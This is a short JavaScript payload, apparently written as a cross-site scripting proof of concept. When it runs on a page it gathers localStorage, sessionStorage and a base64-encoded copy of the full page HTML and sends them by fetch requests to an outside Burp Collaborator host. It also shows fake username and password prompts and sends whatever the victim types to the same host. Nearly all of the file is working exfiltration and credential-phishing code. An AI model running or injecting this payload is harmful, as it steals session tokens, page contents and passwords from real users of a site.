var htmlSource = document.documentElement.outerHTML;
var encoder = new TextEncoder();
var latin1Array = encoder.encode(htmlSource);
var latin1String = String.fromCharCode.apply(null, latin1Array);
var encodedData = btoa(latin1String);

console.log("POC XSS localStorage: ", localStorage)
console.log("POC XSS sessionStorage: ", sessionStorage)
console.log("POC XSS htmlSource: ", latin1String)

fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: 'localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));

fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/dump_html_dom', {method: "POST", body: 'html_dom=_____'+encodedData, headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));

function l() {
  let u = prompt("Username: ", "username");
  let p = prompt("Password: ", "password");

  console.log("POC XSS user,pass input: ", u, p)
  if (u != null) {
    fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?up='+u+'_'+p, { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
	}
}
l()
